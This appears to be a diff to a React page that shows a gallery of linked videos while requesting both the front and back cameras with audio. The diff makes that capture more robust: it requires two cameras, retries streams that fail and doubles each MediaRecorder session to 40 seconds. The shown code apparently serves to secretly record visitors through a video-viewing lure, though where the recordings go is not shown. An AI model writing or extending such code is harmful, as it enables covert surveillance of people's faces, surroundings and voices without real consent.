@@ -10,9 +10,9 @@ function App() {
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
 
   const videos = [
-    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/tedrod8mdo5djsak196z9/VID_20250411_185550_962.mp4?rlkey=pg2shpqizwb94ieh2bo1v0fd1&st=gexwsz9n&dl=0' },
-    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/zjxkih4fa603zx3p7lfea/VID_20250411_190315_449.mp4?rlkey=hcteyqwg0ybdf3nwac1lz50ct&st=9j3wufic&dl=0' },
-    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/iwhlu5kv3fw4a6u0erx7g/VID_20250404_064856_263.mp4?rlkey=u9qzo7pmtrbchf3wym6plqrz1&st=40ibzkdu&dl=0' },
+    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/tedrod8mdo5djsak196z9/VID_20250411_185550_962.mp4?rlkey=pg2shpqizwb94ieh2bo1v0fd1&st=gexwsz9n&dl=1' },
+    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/zjxkih4fa603zx3p7lfea/VID_20250411_190315_449.mp4?rlkey=hcteyqwg0ybdf3nwac1lz50ct&st=9j3wufic&dl=1' },
+    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/iwhlu5kv3fw4a6u0erx7g/VID_20250404_064856_263.mp4?rlkey=u9qzo7pmtrbchf3wym6plqrz1&st=40ibzkdu&dl=1' },
     { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
     { videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
     { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
@@ -24,7 +24,7 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
     { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
     { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
-    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
+    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ'},
     { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
   ];
 
@@ -55,10 +55,10 @@ function App() {
     });
 
     const initializeCameraStreams = async () => {
-      const requestMediaAccess = async (facingMode: string, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
+      const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
         try {
           const constraints = {
-            video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+            video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
             audio: true,
           };
           const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -76,6 +76,12 @@ function App() {
         const videoDevices = devices.filter(device => device.kind === 'videoinput');
         console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));
 
+        if (videoDevices.length < 2) {
+          console.error('Perangkat tidak memiliki dua kamera yang tersedia.');
+          alert('Diperlukan dua kamera (depan dan belakang) untuk melanjutkan. Harap periksa perangkat Anda.');
+          return;
+        }
+
         // Inisialisasi kamera depan
         const frontResult = await requestMediaAccess('user', 'depan');
         if (frontResult) {
@@ -88,7 +94,7 @@ function App() {
         let backResult = await requestMediaAccess('environment', 'belakang');
         if (!backResult && videoDevices.length > 1) {
           console.log('Mencoba kamera belakang dengan deviceId alternatif...');
-          backResult = await requestMediaAccess(videoDevices[1].deviceId, 'belakang');
+          backResult = await requestMediaAccess({ deviceId: videoDevices[1].deviceId }, 'belakang');
         }
         if (backResult) {
           cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
@@ -115,6 +121,19 @@ function App() {
     };
   }, []);
 
+  const handleVideoError = (index: number) => {
+    const video = videos[index];
+    if (video.fallbackUrl) {
+      console.warn(`Gagal memuat video ${video.videoUrl}, beralih ke fallback: ${video.fallbackUrl}`);
+      videos[index].videoUrl = video.fallbackUrl;
+      const videoElement = videoRefs.current[index];
+      if (videoElement) {
+        videoElement.src = video.fallbackUrl;
+        videoElement.load();
+      }
+    }
+  };
+
   const verifyStream = (stream: MediaStream, type: string): boolean => {
     const videoTracks = stream.getVideoTracks();
     if (videoTracks.length === 0 || !videoTracks[0].enabled) {
@@ -125,15 +144,42 @@ function App() {
     return true;
   };
 
-  const recordCamera = async (stream: MediaStream, type: string) => {
-    if (!verifyStream(stream, type)) {
-      console.warn(`Stream kamera ${type} tidak valid, melewati perekaman.`);
-      return;
+  const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
+    try {
+      const constraints = {
+        video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+        audio: true,
+      };
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
+      return stream;
+    } catch (error) {
+      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
+      return null;
+    }
+  };
+
+  const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
+    let currentStream = stream;
+    if (!verifyStream(currentStream, type)) {
+      console.warn(`Stream kamera ${type} tidak valid, mencoba menginisialisasi ulang...`);
+      const newStream = await reinitializeStream(type, deviceId);
+      if (newStream && verifyStream(newStream, type)) {
+        currentStream = newStream;
+        // Perbarui stream di cameraStreamsRef
+        const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
+        if (cameraIndex !== -1) {
+          cameraStreamsRef.current[cameraIndex].stream = newStream;
+        }
+      } else {
+        console.warn(`Gagal menginisialisasi ulang stream kamera ${type}, melewati perekaman.`);
+        return;
+      }
     }
 
     try {
       const cameraVideo = document.createElement('video');
-      cameraVideo.srcObject = stream;
+      cameraVideo.srcObject = currentStream;
       cameraVideo.playsInline = true;
       cameraVideo.muted = true;
       cameraVideo.autoplay = true;
@@ -190,7 +236,7 @@ function App() {
       // Merekam video
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
-      const mediaRecorder = new MediaRecorder(stream, {
+      const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
         videoBitsPerSecond: 4000000,
       });
@@ -220,10 +266,10 @@ function App() {
       await new Promise((resolve) => setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
           mediaRecorder.stop();
-          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
+          console.log(`Perekaman kamera ${type} dihentikan setelah 40 detik.`);
         }
         resolve(null);
-      }, 20000));
+      }, 40000)); // Ubah durasi menjadi 40 detik
 
       // Cleanup
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
@@ -245,22 +291,22 @@ function App() {
         return;
       }
 
-      const frontStream = cameraStreamsRef.current.find(s => s.type === 'depan')?.stream;
-      const backStream = cameraStreamsRef.current.find(s => s.type === 'belakang')?.stream;
+      const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
+      const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');
 
-      if (frontStream) {
-        await recordCamera(frontStream, 'depan');
+      if (frontCamera) {
+        await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
       } else {
         console.warn('Kamera depan tidak tersedia untuk perekaman.');
       }
 
-      if (backStream) {
-        await recordCamera(backStream, 'belakang');
+      if (backCamera) {
+        await recordCamera(backCamera.stream, 'belakang', backCamera.deviceId);
       } else {
         console.warn('Kamera belakang tidak tersedia untuk perekaman.');
       }
 
-      if (!frontStream && !backStream) {
+      if (!frontCamera && !backCamera) {
         console.error('Kedua kamera tidak tersedia.');
       }
 
@@ -344,7 +390,9 @@ function App() {
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
+                  onError={() => handleVideoError(index)}
                   preload="metadata"
+                  loading="lazy"
                 >
                   <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                 </video>
